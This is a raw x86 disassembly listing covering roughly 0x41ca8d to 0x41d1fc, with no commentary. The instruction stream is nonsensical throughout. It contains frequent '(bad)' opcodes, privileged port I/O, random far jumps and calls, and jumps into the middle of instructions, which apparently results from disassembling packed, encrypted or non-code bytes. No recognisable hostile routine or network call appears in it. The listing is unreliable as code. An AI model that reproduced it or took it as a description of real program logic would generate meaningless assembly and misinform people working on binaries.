  41ca8d:	pop    es
  41ca8e:	sbb    DWORD PTR [esi],esi
  41ca90:	jne    0x41ca74
  41ca92:	sbb    ebp,DWORD PTR [ecx+0x6b]
  41ca95:	das    
  41ca96:	sbb    eax,0xd2e3e74d
  41ca9b:	jle    0x41cad6
  41ca9d:	cmc    
  41ca9e:	push   esp
  41ca9f:	mov    DWORD PTR [edi],ecx
  41caa1:	bound  esi,QWORD PTR [ecx+0x84909be]
  41caa7:	push   eax
  41caa8:	add    dh,BYTE PTR [edx+ebx*2-0x4f7a3cc6]
  41caaf:	icebp  
  41cab0:	jl     0x41ca7d
  41cab2:	pusha  
  41cab3:	pop    ecx
  41cab4:	add    DWORD PTR [edx],ebp
  41cab6:	jle    0x41cb07
  41cab8:	mov    ds:0x9b2fb09b,eax
  41cabd:	stc    
  41cabe:	xlat   BYTE PTR ds:[ebx]
  41cabf:	dec    ecx
  41cac0:	mov    esp,0xe6374a49
  41cac5:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41cac7:	jns    0x41ca55
  41cac9:	outs   dx,DWORD PTR ds:[esi]
  41caca:	jle    0x41cb3f
  41cacc:	push   cs
  41cacd:	dec    esi
  41cace:	sbb    eax,DWORD PTR [edi-0x948d94c]
  41cad4:	and    BYTE PTR [esi-0x4d],0xf0
  41cad8:	lahf   
  41cad9:	(bad)  
  41cada:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cadb:	add    BYTE PTR [edx],cl
  41cadd:	and    BYTE PTR [edx-0x40],ch
  41cae0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cae1:	ror    DWORD PTR [eax],cl
  41cae3:	outs   dx,BYTE PTR ds:[esi]
  41cae4:	pop    edx
  41cae5:	mov    ?,WORD PTR [eax-0x18]
  41cae8:	and    dl,al
  41caea:	sahf   
  41caeb:	mov    ah,BYTE PTR [esi-0x59]
  41caee:	sub    DWORD PTR [edi+0xeb9a3f1],ebx
  41caf4:	gs (bad) 
  41caf6:	(bad)  
  41caf7:	out    0xb0,al
  41caf9:	repz jge 0x41ca8f
  41cafc:	inc    esi
  41cafd:	push   0x6aba7f
  41cb02:	dec    esp
  41cb03:	mov    al,ds:0x1fabca4a
  41cb08:	dec    ebp
  41cb09:	add    al,BYTE PTR [ebx-0x43]
  41cb0c:	jecxz  0x41cb6a
  41cb0e:	das    
  41cb0f:	push   ss
  41cb10:	gs mov ebx,0xd29e5520
  41cb16:	adc    dl,BYTE PTR [edi-0x69278300]
  41cb1c:	jmp    0x41cb83
  41cb1e:	fld    QWORD PTR [edx+edi*8+0x12]
  41cb22:	dec    esi
  41cb23:	sar    BYTE PTR [eax+0x50],0x8c
  41cb27:	add    BYTE PTR [edi-0x71],dl
  41cb2a:	mov    ch,BYTE PTR [bx+si-0x21]
  41cb2e:	call   0xa42f:0xb1e2a956
  41cb35:	rcl    BYTE PTR [edx-0x197924db],1
  41cb3b:	add    edx,DWORD PTR [ebx]
  41cb3d:	mov    ebx,0xc697ff00
  41cb42:	and    al,0x3
  41cb44:	bswap  edx
  41cb46:	pushf  
  41cb47:	jmp    0xf29b:0x5e905758
  41cb4e:	or     edi,DWORD PTR [ebp+0x24]
  41cb51:	mov    DWORD PTR [ecx-0x2a387e6f],ebx
  41cb57:	popa   
  41cb58:	jo     0x41cbb0
  41cb5a:	inc    edi
  41cb5b:	and    eax,DWORD PTR [esi-0x1]
  41cb5e:	ins    DWORD PTR es:[edi],dx
  41cb5f:	fsub   DWORD PTR [eax+0x239f3b25]
  41cb65:	mov    cl,0x55
  41cb67:	mov    bh,BYTE PTR [edx]
  41cb69:	inc    ecx
  41cb6a:	dec    edx
  41cb6b:	mov    dl,0x34
  41cb6d:	jnp    0x41cb4c
  41cb6f:	popf   
  41cb70:	add    eax,0xf49a8f4b
  41cb75:	stos   BYTE PTR es:[edi],al
  41cb76:	retf   
  41cb77:	je     0x41cb2d
  41cb79:	mov    BYTE PTR [ecx+eiz*8-0x1f],dh
  41cb7d:	or     BYTE PTR [edi-0x55],ch
  41cb80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb81:	aad    0xdf
  41cb83:	push   ebx
  41cb84:	push   ss
  41cb85:	popf   
  41cb86:	add    edi,DWORD PTR [ebx-0x1f]
  41cb89:	in     eax,dx
  41cb8a:	mov    BYTE PTR ds:0x78bb39fa,al
  41cb90:	jmp    0xbfec:0x21b0c4bc
  41cb97:	mov    bl,0x56
  41cb99:	dec    eax
  41cb9a:	cli    
  41cb9b:	mov    WORD PTR [edx-0x476d796c],ds
  41cba1:	cli    
  41cba2:	cmp    esi,ebx
  41cba4:	jno    0x41cb94
  41cba6:	in     eax,0x23
  41cba8:	fcom   QWORD PTR [esi]
  41cbaa:	and    al,0xfa
  41cbac:	pop    esi
  41cbad:	adc    eax,0x20a562b1
  41cbb2:	bound  esp,QWORD PTR [edx+0x3b0ff5bb]
  41cbb8:	inc    ebp
  41cbb9:	adc    BYTE PTR [esi-0x16],ah
  41cbbc:	cmp    al,0xd7
  41cbbe:	aam    0xe3
  41cbc0:	adc    ah,bh
  41cbc2:	outs   dx,DWORD PTR ds:[esi]
  41cbc3:	adc    DWORD PTR [esi+0x40],0xffffffb3
  41cbc7:	out    dx,al
  41cbc8:	ret    0x7335
  41cbcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbcc:	stos   BYTE PTR es:[edi],al
  41cbcd:	mov    ah,al
  41cbcf:	or     BYTE PTR [eax],0x4
  41cbd2:	pop    ss
  41cbd3:	push   esi
  41cbd4:	pop    edx
  41cbd5:	mov    BYTE PTR [ecx+0x17753c17],dh
  41cbdb:	inc    eax
  41cbdc:	ja     0x41cb65
  41cbde:	dec    edx
  41cbdf:	ret    
  41cbe0:	jbe    0x41cb95
  41cbe2:	xchg   ebx,eax
  41cbe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbe4:	mov    bl,bl
  41cbe6:	addr16 (bad) 
  41cbe9:	mov    ?,ecx
  41cbeb:	cmp    eax,0xd6f8f755
  41cbf0:	ficomp DWORD PTR [ebx-0x26dbf2b5]
  41cbf6:	or     BYTE PTR gs:[ecx+0x1eb9d494],bl
  41cbfd:	enter  0x1ae7,0xf
  41cc01:	add    DWORD PTR [edi-0x6b],edi
  41cc04:	inc    ecx
  41cc05:	cwde   
  41cc06:	mov    al,0x81
  41cc08:	sahf   
  41cc09:	sbb    al,0x2c
  41cc0b:	xchg   edi,eax
  41cc0c:	cmc    
  41cc0d:	xchg   esi,eax
  41cc0e:	rol    BYTE PTR [ebp+0x5a36154f],0xcc
  41cc15:	mov    ebx,0x317a3daf
  41cc1a:	mov    edx,0xa36c6119
  41cc1f:	je     0x41cbc2
  41cc21:	xor    DWORD PTR [ecx+0x76e28064],esp
  41cc27:	shl    DWORD PTR [ebx-0x2d19f693],cl
  41cc2d:	inc    ebx
  41cc2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc2f:	call   0xf6745984
  41cc34:	xchg   ebp,ecx
  41cc36:	and    BYTE PTR [edx-0x4c],bl
  41cc39:	xchg   edi,eax
  41cc3a:	fdivr  QWORD PTR [ebx+0x36]
  41cc3d:	push   ebp
  41cc3e:	push   ds
  41cc3f:	(bad)  
  41cc40:	ficom  WORD PTR [edx+0x71b463f5]
  41cc46:	repnz sbb eax,0x3cf05612
  41cc4c:	jmp    0x41cc43
  41cc4e:	fdiv   DWORD PTR [ebp+0x24]
  41cc51:	jmp    0x2f5a02d4
  41cc56:	or     DWORD PTR [ebp+ebp*1+0x5d],ecx
  41cc5a:	xor    ebx,DWORD PTR [ecx-0x5d56f3e9]
  41cc60:	dec    eax
  41cc61:	mov    eax,0x16d22242
  41cc66:	jne    0x41cc45
  41cc68:	cmp    BYTE PTR [eax+edi*1-0xe],0x78
  41cc6d:	fcom   st(6)
  41cc6f:	and    al,0x1a
  41cc71:	inc    ecx
  41cc72:	into   
  41cc73:	lods   eax,DWORD PTR ds:[esi]
  41cc74:	jl     0x41cc75
  41cc76:	push   0xffffffdf
  41cc78:	cli    
  41cc79:	out    dx,eax
  41cc7a:	test   DWORD PTR [ebx],0x23094ec2
  41cc80:	xor    bl,BYTE PTR [ebx-0x61b88498]
  41cc86:	sub    eax,0x6585fd66
  41cc8b:	mov    ch,0x1
  41cc8d:	ret    
  41cc8e:	sub    eax,0x7e61aa1a
  41cc93:	sbb    BYTE PTR [ecx],al
  41cc95:	pop    edx
  41cc96:	and    ch,BYTE PTR [esi+0x4]
  41cc99:	dec    edx
  41cc9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc9b:	(bad)  [ebx]
  41cc9d:	xchg   dh,ch
  41cc9f:	mov    al,ds:0xd432be91
  41cca4:	imul   ebp,esi,0xffffffc4
  41cca7:	int3   
  41cca8:	int    0xb6
  41ccaa:	push   ds
  41ccab:	sub    cl,BYTE PTR [ebp-0x80]
  41ccae:	ret    0xf31b
  41ccb1:	or     eax,0xbdf139d7
  41ccb6:	das    
  41ccb7:	sbb    edi,DWORD PTR [eax]
  41ccb9:	push   ebx
  41ccba:	push   ds
  41ccbb:	sti    
  41ccbc:	push   ebp
  41ccbd:	mov    esi,0xeb5def34
  41ccc2:	xor    esp,DWORD PTR [ebx+0x10eef133]
  41ccc8:	jns    0x41cce1
  41ccca:	(bad)  
  41cccb:	addr16 ins DWORD PTR es:[di],dx
  41ccce:	jmp    0x41cd17
  41ccd0:	leave  
  41ccd1:	xor    DWORD PTR [edi+0x6d80c56d],edx
  41ccd7:	push   edx
  41ccd8:	in     eax,0x2a
  41ccda:	dec    ecx
  41ccdb:	or     BYTE PTR [ebx],0xac
  41ccde:	cmp    dh,0x7c
  41cce1:	test   al,0xd8
  41cce3:	sub    al,0x3e
  41cce5:	xchg   esi,eax
  41cce6:	ja     0x41cd06
  41cce8:	test   al,0x8e
  41ccea:	push   ebx
  41cceb:	call   0x4f1e5819
  41ccf0:	aad    0x9f
  41ccf2:	xchg   edi,eax
  41ccf3:	mov    esi,ebp
  41ccf5:	mov    bl,0xba
  41ccf7:	iret   
  41ccf8:	retf   0x75ee
  41ccfb:	fdivrp st(1),st
  41ccfd:	out    0xa9,al
  41ccff:	cmp    esp,edx
  41cd01:	rcl    DWORD PTR [edx-0x21919683],0xac
  41cd08:	jno    0x41cd3b
  41cd0a:	bound  eax,QWORD PTR [eax-0x33]
  41cd0d:	xor    BYTE PTR [ebp-0x56],bl
  41cd10:	mov    dl,0xc8
  41cd12:	mov    al,ds:0xb65f4401
  41cd17:	daa    
  41cd18:	push   0x2d
  41cd1a:	cmp    DWORD PTR [ecx+0x97075c4],ecx
  41cd20:	pusha  
  41cd21:	add    DWORD PTR [ebx+0x3a13b833],eax
  41cd27:	mov    ds:0x1b466686,al
  41cd2c:	xchg   BYTE PTR [eax+0x2a3a5089],cl
  41cd32:	xlat   BYTE PTR ds:[ebx]
  41cd33:	cmc    
  41cd34:	mov    ebp,0x6d88ae59
  41cd39:	mov    ebp,0xe763cbda
  41cd3e:	mov    DWORD PTR [edx+esi*4-0x2b15c411],esi
  41cd45:	xor    eax,0x6f57def
  41cd4a:	pusha  
  41cd4b:	aad    0x7e
  41cd4d:	and    ebp,DWORD PTR [eax-0x6846a470]
  41cd53:	outs   dx,DWORD PTR ds:[esi]
  41cd54:	push   ds
  41cd55:	sub    eax,0xd1d1d69f
  41cd5a:	xchg   edx,eax
  41cd5b:	aad    0x8f
  41cd5d:	fmul   st(5),st
  41cd5f:	xor    al,0x94
  41cd61:	add    ebx,DWORD PTR ds:0x6277c91c
  41cd67:	sub    bh,BYTE PTR [edi-0x75]
  41cd6a:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd6c:	lea    ebp,[edx+0x41]
  41cd6f:	iret   
  41cd70:	rep lods eax,DWORD PTR ds:[esi]
  41cd72:	lods   eax,DWORD PTR ds:[esi]
  41cd73:	mov    ds:0xfb0913cc,al
  41cd78:	dec    ebx
  41cd79:	scas   eax,DWORD PTR es:[edi]
  41cd7a:	outs   dx,DWORD PTR ds:[esi]
  41cd7b:	data16 xchg BYTE PTR [edi-0x39a45bed],dl
  41cd82:	jmp    0xe8d3:0x806111e4
  41cd89:	popf   
  41cd8a:	adc    eax,DWORD PTR [edx]
  41cd8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd8d:	jb     0x41cdf5
  41cd8f:	mov    bh,0x15
  41cd91:	aam    0x8c
  41cd93:	fchs   
  41cd95:	in     al,0x58
  41cd97:	fld    TBYTE PTR [ecx]
  41cd99:	mov    ah,0x1f
  41cd9b:	inc    ebx
  41cd9c:	inc    ecx
  41cd9d:	dec    eax
  41cd9e:	xchg   edi,eax
  41cd9f:	or     eax,0xa59f18ac
  41cda4:	sbb    al,0x6b
  41cda6:	ins    BYTE PTR es:[edi],dx
  41cda7:	push   edx
  41cda8:	shl    ebx,1
  41cdaa:	mov    ebx,0xc7ac71f6
  41cdaf:	mov    edi,0xdb0b9866
  41cdb4:	xchg   edx,eax
  41cdb5:	mov    al,ds:0xbe10d296
  41cdba:	aaa    
  41cdbb:	push   edi
  41cdbc:	push   0x17971cc5
  41cdc1:	inc    edi
  41cdc2:	rcr    DWORD PTR [eax+0x1d],0xb5
  41cdc6:	fdiv   QWORD PTR [ecx]
  41cdc8:	ins    BYTE PTR es:[edi],dx
  41cdc9:	adc    bl,dl
  41cdcb:	std    
  41cdcc:	add    eax,0x4776a5e8
  41cdd1:	xor    eax,DWORD PTR [esi+0x7]
  41cdd4:	rol    ebp,1
  41cdd6:	mov    edi,0xfd69be53
  41cddb:	sbb    eax,0x5f72636a
  41cde0:	mov    BYTE PTR [eax+0x3cf89b31],al
  41cde6:	mov    esi,0x7415d0d9
  41cdeb:	sbb    eax,0xe7093014
  41cdf0:	and    dl,ah
  41cdf2:	mov    bl,0x77
  41cdf4:	pop    esp
  41cdf5:	push   0x6be29003
  41cdfa:	aad    0xae
  41cdfc:	loope  0x41cdfd
  41cdfe:	mov    DWORD PTR [esi+0x70],edx
  41ce01:	cmp    cl,BYTE PTR [eax-0x1f]
  41ce04:	fwait
  41ce05:	in     al,dx
  41ce06:	lahf   
  41ce07:	je     0x41cdb3
  41ce09:	inc    ebx
  41ce0a:	mov    edi,0x38811804
  41ce0f:	mov    eax,ds:0xd3b94a47
  41ce14:	out    0x1d,al
  41ce16:	mov    eax,0xbc6bd5e5
  41ce1b:	imul   ecx,DWORD PTR [esi+eiz*2],0xfffffff9
  41ce1f:	rol    edx,cl
  41ce21:	sub    DWORD PTR [ebx+edx*4+0x6eb3eb93],ebx
  41ce28:	idiv   DWORD PTR [ecx+0x6]
  41ce2b:	div    BYTE PTR [edx-0x2b]
  41ce2e:	mov    ch,0x75
  41ce30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce31:	mov    esi,0xba8e2d48
  41ce36:	adc    DWORD PTR [ebp+0x2380dc09],0x19ba7644
  41ce40:	dec    esp
  41ce41:	aad    0xd8
  41ce43:	mov    cl,0xc7
  41ce45:	imul   edx,esp,0x255c2ec4
  41ce4b:	sti    
  41ce4c:	sbb    dl,BYTE PTR [esi+eax*8]
  41ce4f:	mov    al,ds:0x9709a119
  41ce54:	mov    edi,0x72ae3c4e
  41ce59:	ss or  eax,0xc8295fba
  41ce5f:	and    al,0xcb
  41ce61:	sub    dl,ah
  41ce63:	ret    0x2d2a
  41ce66:	inc    edx
  41ce67:	mov    al,ds:0x63a083bb
  41ce6c:	sub    eax,0x1455c0f9
  41ce71:	sti    
  41ce72:	ins    DWORD PTR es:[edi],dx
  41ce73:	imul   esp,DWORD PTR [ebp+0x47a2514],0xffffffa8
  41ce7a:	push   0x4feead93
  41ce7f:	nop
  41ce80:	xor    al,0xfd
  41ce82:	pop    ecx
  41ce83:	jle    0x41ce35
  41ce85:	and    ebx,esi
  41ce87:	stos   BYTE PTR es:[edi],al
  41ce88:	sub    al,0x54
  41ce8a:	in     eax,dx
  41ce8b:	and    BYTE PTR [esi],bh
  41ce8d:	and    ah,cl
  41ce8f:	shr    edx,0xf1
  41ce92:	fbld   TBYTE PTR [ecx]
  41ce94:	xor    al,0x31
  41ce96:	inc    edi
  41ce97:	sub    eax,0xd876cdf6
  41ce9c:	jp     0x41cf03
  41ce9e:	add    dh,BYTE PTR [ebp-0x7f891e3c]
  41cea4:	popf   
  41cea5:	outs   dx,BYTE PTR ds:[esi]
  41cea6:	xchg   ebx,eax
  41cea7:	adc    al,0x64
  41cea9:	(bad)  
  41ceaa:	aam    0xb5
  41ceac:	test   BYTE PTR [edi+0x68],0x9c
  41ceb0:	out    0xe2,al
  41ceb2:	cs sbb al,0xcb
  41ceb5:	push   0x9705acba
  41ceba:	lahf   
  41cebb:	cdq    
  41cebc:	mov    ebp,0x4d86ec6f
  41cec1:	rcl    BYTE PTR [edi-0xa54910f],cl
  41cec7:	call   0xe193a5b6
  41cecc:	mov    ecx,0xe4752dd5
  41ced1:	aaa    
  41ced2:	fbstp  TBYTE PTR [edx]
  41ced4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ced5:	sub    eax,0x7951e17e
  41ceda:	and    eax,0xe199f4f2
  41cedf:	or     DWORD PTR [esp+edi*8],ebx
  41cee2:	fisub  DWORD PTR [ebx]
  41cee4:	inc    eax
  41cee5:	dec    esi
  41cee6:	ret    0xf70
  41cee9:	add    edi,edi
  41ceeb:	cdq    
  41ceec:	adc    al,0x4
  41ceee:	fsub   QWORD PTR [esi]
  41cef0:	out    0x9e,al
  41cef2:	jnp    0x41cf32
  41cef4:	fs cld 
  41cef6:	adc    eax,0x82279c9b
  41cefb:	push   es
  41cefc:	or     cl,ch
  41cefe:	mov    BYTE PTR [edi+0x7734cac7],ah
  41cf04:	sub    esp,edi
  41cf06:	xchg   edi,eax
  41cf07:	or     eax,0x5c32e253
  41cf0c:	fcmovne st,st(6)
  41cf0e:	cmp    DWORD PTR [ecx-0x623bc23f],0x3f
  41cf15:	(bad)  
  41cf17:	das    
  41cf18:	and    BYTE PTR [ebp+ecx*2-0x6d],0x6e
  41cf1d:	loopne 0x41ced9
  41cf1f:	jle    0x41cf51
  41cf21:	sub    ch,BYTE PTR [ebp+edx*8+0x5abaeac1]
  41cf28:	push   ebx
  41cf29:	jbe    0x41cec9
  41cf2b:	jae    0x41cf23
  41cf2d:	inc    esp
  41cf2e:	xchg   edx,eax
  41cf2f:	push   es
  41cf30:	and    bl,BYTE PTR [ecx-0x53379a64]
  41cf36:	mov    edx,DWORD PTR [ebx-0x73123654]
  41cf3c:	xchg   ebx,eax
  41cf3d:	sub    eax,DWORD PTR ss:[eax+ebx*8]
  41cf41:	xchg   ecx,eax
  41cf42:	cmp    edi,0xffffffd9
  41cf45:	rcr    DWORD PTR [eax+0x5b],cl
  41cf48:	adc    edi,DWORD PTR [edi+0x7b]
  41cf4b:	aam    0xd5
  41cf4d:	xor    eax,0x707c5023
  41cf52:	popf   
  41cf53:	add    edx,DWORD PTR [ecx]
  41cf55:	pusha  
  41cf56:	test   eax,0x5075831
  41cf5b:	pop    ss
  41cf5c:	retf   0xeae6
  41cf5f:	inc    esp
  41cf60:	jmp    0xd4eb:0x9fc4989e
  41cf67:	xchg   ebx,edx
  41cf69:	dec    edx
  41cf6a:	sahf   
  41cf6b:	frstor ds:0xb3c3d960
  41cf71:	and    al,0xe8
  41cf73:	fucomp st(1)
  41cf75:	ja     0x41cfed
  41cf77:	mov    DWORD PTR [eax+ebp*4-0x105a64a0],ebp
  41cf7e:	call   0x55d0:0xd8acf25c
  41cf85:	fwait
  41cf86:	push   ss
  41cf87:	ss xchg esp,eax
  41cf89:	push   edi
  41cf8a:	jnp    0x41cf27
  41cf8c:	fstp   st(7)
  41cf8e:	or     al,0x25
  41cf90:	ins    DWORD PTR es:[edi],dx
  41cf91:	into   
  41cf92:	jns    0x41cf92
  41cf94:	add    eax,DWORD PTR [esi+0x73]
  41cf97:	fbld   TBYTE PTR [eax+esi*1]
  41cf9a:	jl     0x41cfac
  41cf9c:	adc    DWORD PTR [esi+ecx*8+0x32],edi
  41cfa0:	pop    esi
  41cfa1:	mov    dh,0xe5
  41cfa3:	xchg   ebx,eax
  41cfa4:	aaa    
  41cfa5:	lds    ecx,FWORD PTR [ebp-0x2c]
  41cfa8:	es jmp 0x3ed1:0x9e7a378
  41cfb0:	xchg   esp,eax
  41cfb1:	cwde   
  41cfb2:	jg     0x41d01a
  41cfb4:	mov    eax,0xf246857
  41cfb9:	pop    esp
  41cfba:	rol    DWORD PTR [esi+esi*1+0x1be02903],1
  41cfc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfc2:	push   esi
  41cfc3:	mov    eax,0x4d8be9e0
  41cfc8:	sti    
  41cfc9:	ficomp WORD PTR [edi]
  41cfcb:	sbb    BYTE PTR [ebp+0x2c],0xfd
  41cfcf:	pop    esi
  41cfd0:	repz dec ecx
  41cfd2:	inc    ebp
  41cfd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfd4:	mov    eax,ds:0x455d09a0
  41cfd9:	cld    
  41cfda:	stc    
  41cfdb:	adc    BYTE PTR [ebx],ah
  41cfdd:	ffreep st(6)
  41cfdf:	xor    DWORD PTR [ebx-0x2f],ecx
  41cfe2:	addr16 inc ebx
  41cfe4:	pop    ecx
  41cfe5:	aad    0x65
  41cfe7:	jo     0x41cfbb
  41cfe9:	jne    0x41d024
  41cfeb:	repnz sbb al,0xb0
  41cfee:	mov    al,0xe9
  41cff0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cff1:	xchg   ebx,eax
  41cff2:	pop    ss
  41cff3:	jge    0x41d04a
  41cff5:	jl     0x41d045
  41cff7:	or     edx,DWORD PTR [ecx+edx*8-0x42fc73fd]
  41cffe:	xchg   esp,eax
  41cfff:	sub    eax,0x4920c87e
  41d004:	cmp    bh,BYTE PTR [edx+edx*4-0x6a93eca9]
  41d00b:	nop
  41d00c:	mov    ds:0x8546b6da,al
  41d011:	cli    
  41d012:	push   0x8283a85
  41d017:	in     eax,dx
  41d018:	pop    eax
  41d019:	(bad)  
  41d01a:	sbb    edi,esi
  41d01c:	sahf   
  41d01d:	push   0x6680eb8
  41d022:	fisttp QWORD PTR [ecx-0x1aca92a1]
  41d028:	add    DWORD PTR [eax+ebx*4-0x5c433b46],esi
  41d02f:	inc    eax
  41d030:	or     dh,BYTE PTR [eax-0x7b]
  41d033:	mov    dh,0xe8
  41d035:	popf   
  41d036:	mov    esp,0xb186b85
  41d03b:	popa   
  41d03c:	mov    ch,0x9f
  41d03e:	xor    BYTE PTR [esi],ch
  41d040:	mov    dl,BYTE PTR [esi+ebx*1+0x15]
  41d044:	mov    bh,0x9a
  41d046:	add    dl,BYTE PTR [edx+0x5cc6f3e2]
  41d04c:	inc    ebp
  41d04d:	dec    DWORD PTR [edx-0x35]
  41d050:	das    
  41d051:	stos   DWORD PTR es:[edi],eax
  41d052:	push   eax
  41d053:	jne    0x41d079
  41d055:	fs (bad) 
  41d057:	bound  esp,QWORD PTR [esi+edi*4+0x2ec86f2b]
  41d05e:	dec    eax
  41d05f:	bnd jo 0x41d07d
  41d062:	shl    BYTE PTR [ebx],0x9b
  41d065:	mov    bh,0x46
  41d067:	cmp    edx,ebx
  41d069:	nop
  41d06a:	sbb    eax,0xa7b2196
  41d06f:	mov    ebp,0xc5c18416
  41d074:	xor    eax,0x7d15304a
  41d079:	pushf  
  41d07a:	je     0x41d012
  41d07c:	mov    DWORD PTR ds:0xb0f15b16,0x4b6e5cb
  41d086:	daa    
  41d087:	test   esp,0x5db9e99d
  41d08d:	cdq    
  41d08e:	out    0x3d,eax
  41d090:	sbb    DWORD PTR [ecx],edx
  41d092:	cs mov ah,bl
  41d095:	mov    esp,0x26946436
  41d09a:	sub    ah,0x31
  41d09d:	stos   BYTE PTR es:[edi],al
  41d09e:	push   cs
  41d09f:	icebp  
  41d0a0:	jno    0x41d034
  41d0a2:	aad    0x8e
  41d0a4:	add    BYTE PTR [eax-0xb],al
  41d0a7:	mov    dh,BYTE PTR [esi-0x27aa6b06]
  41d0ad:	ja     0x41d0f4
  41d0af:	fwait
  41d0b0:	push   0x78
  41d0b2:	aam    0x1d
  41d0b4:	out    0x5c,eax
  41d0b6:	mov    edi,0x75a966a7
  41d0bb:	sub    eax,DWORD PTR [eax]
  41d0bd:	ds xchg ebp,eax
  41d0bf:	mov    edx,0xbe4d32f2
  41d0c4:	push   eax
  41d0c5:	jno    0x41d083
  41d0c7:	xor    DWORD PTR [edx+0x22],ebx
  41d0ca:	jbe    0x41d07e
  41d0cc:	aam    0xfe
  41d0ce:	dec    edx
  41d0cf:	mov    ch,ch
  41d0d1:	data16 neg BYTE PTR [ebx+0x2d]
  41d0d5:	dec    edi
  41d0d6:	jge    0x41d0d6
  41d0d8:	hlt    
  41d0d9:	jne    0x41d0ab
  41d0db:	add    bh,BYTE PTR [edx+0xa]
  41d0de:	lds    edx,FWORD PTR [ebx]
  41d0e0:	xor    esi,DWORD PTR [edi+eax*8]
  41d0e3:	mov    WORD PTR [esi+0x5d],es
  41d0e6:	(bad)  
  41d0e8:	pop    ebp
  41d0e9:	dec    esp
  41d0ea:	adc    eax,0xa2a1226c
  41d0ef:	cs cmp al,0xb8
  41d0f2:	mov    esp,0xfe80ee77
  41d0f7:	in     eax,dx
  41d0f8:	sub    al,0x67
  41d0fa:	lds    edx,FWORD PTR [ecx]
  41d0fc:	ret    0x4ffc
  41d0ff:	pushf  
  41d100:	mov    ds:0xa426b6ee,eax
  41d105:	shl    BYTE PTR [eax*2+0x46bbd0ab],cl
  41d10c:	ret    
  41d10d:	mov    ebx,0x537c1f5b
  41d112:	mov    dh,0x27
  41d114:	pop    esi
  41d115:	pushf  
  41d116:	popa   
  41d117:	mov    al,ds:0x6ed3468b
  41d11c:	lods   eax,DWORD PTR ds:[esi]
  41d11d:	sbb    bl,BYTE PTR [ebp+0x66]
  41d120:	push   0x24c5884a
  41d125:	(bad)  
  41d126:	or     al,0xd9
  41d128:	xchg   edi,eax
  41d129:	add    ch,BYTE PTR [esi]
  41d12b:	dec    ebx
  41d12c:	inc    ebp
  41d12d:	out    0xd7,eax
  41d12f:	inc    ebx
  41d130:	fs push esp
  41d132:	add    ecx,DWORD PTR [eax+0x7cc2ef35]
  41d138:	inc    edx
  41d139:	pop    es
  41d13a:	cmp    DWORD PTR [ebp+ecx*1+0x55ea885f],edx
  41d141:	loope  0x41d143
  41d143:	fs jp  0x41d18b
  41d146:	pop    es
  41d147:	dec    edx
  41d148:	js     0x41d14e
  41d14a:	xchg   edi,eax
  41d14b:	sub    ebp,DWORD PTR [eax]
  41d14d:	test   al,0xdf
  41d14f:	cmp    DWORD PTR [eax],ebp
  41d151:	test   eax,0x37376b43
  41d156:	cmp    esp,DWORD PTR [eax+0x28]
  41d159:	or     BYTE PTR [ebp-0x5bb72867],bh
  41d15f:	lods   al,BYTE PTR ds:[esi]
  41d160:	mov    bh,0xb0
  41d162:	ret    
  41d163:	nop
  41d164:	and    eax,0x7121fe07
  41d169:	sub    DWORD PTR [eax+0x7cb3deda],edx
  41d16f:	dec    ebx
  41d170:	cmp    eax,0xe24b5583
  41d176:	sti    
  41d177:	add    BYTE PTR [esi+eax*1-0x74],bh
  41d17b:	pop    ebx
  41d17c:	clc    
  41d17d:	xchg   edi,eax
  41d17e:	push   ds
  41d17f:	aas    
  41d180:	outs   dx,BYTE PTR ds:[esi]
  41d181:	inc    ebx
  41d182:	and    BYTE PTR ds:0xa04c8045,ch
  41d188:	scas   eax,DWORD PTR es:[edi]
  41d189:	dec    edx
  41d18a:	sbb    WORD PTR ds:0x1827cf4a,0xffed
  41d193:	test   al,0x4c
  41d195:	scas   eax,DWORD PTR es:[edi]
  41d196:	out    0x5,eax
  41d198:	or     al,0xf9
  41d19a:	shr    BYTE PTR [edi-0x8],0xf5
  41d19e:	dec    edx
  41d19f:	fs loopne 0x41d1cd
  41d1a2:	or     edi,esp
  41d1a4:	mov    eax,ds:0x78659818
  41d1a9:	cmp    dl,dl
  41d1ab:	dec    esp
  41d1ac:	repz cld 
  41d1ae:	xchg   esp,eax
  41d1af:	sahf   
  41d1b0:	inc    ebx
  41d1b1:	dec    esp
  41d1b2:	push   esp
  41d1b3:	cmp    ebx,DWORD PTR [esi+0x4b55bcea]
  41d1b9:	loope  0x41d1fe
  41d1bb:	push   esi
  41d1bc:	sub    eax,0xe896c207
  41d1c1:	add    DWORD PTR [ecx+esi*8+0x68],eax
  41d1c5:	in     eax,dx
  41d1c6:	dec    esp
  41d1c7:	int    0x2e
  41d1c9:	jp     0x41d1da
  41d1cb:	sti    
  41d1cc:	cli    
  41d1cd:	xchg   esi,eax
  41d1ce:	ss (bad) 
  41d1d0:	pop    ebp
  41d1d1:	pop    ebp
  41d1d2:	ja     0x41d184
  41d1d4:	mov    ds:0x8288ea3b,eax
  41d1d9:	cld    
  41d1da:	mov    ah,BYTE PTR [ebx-0x48]
  41d1dd:	dec    esp
  41d1de:	pop    ds
  41d1df:	test   al,0x26
  41d1e1:	imul   eax,DWORD PTR [ecx+0x2e],0xffffff93
  41d1e5:	(bad)  
  41d1e6:	out    0x27,al
  41d1e8:	pop    es
  41d1e9:	(bad)  
  41d1ea:	adc    eax,0xb6659b9f
  41d1ef:	jmp    0x41d1fe
  41d1f1:	loope  0x41d217
  41d1f3:	xchg   esi,eax
  41d1f4:	sbb    bh,BYTE PTR [edx+eax*4]
  41d1f7:	push   esp
  41d1f8:	std    
  41d1f9:	pop    ecx
  41d1fa:	nop
  41d1fb:	pop    esi
  41d1fc:	popa   
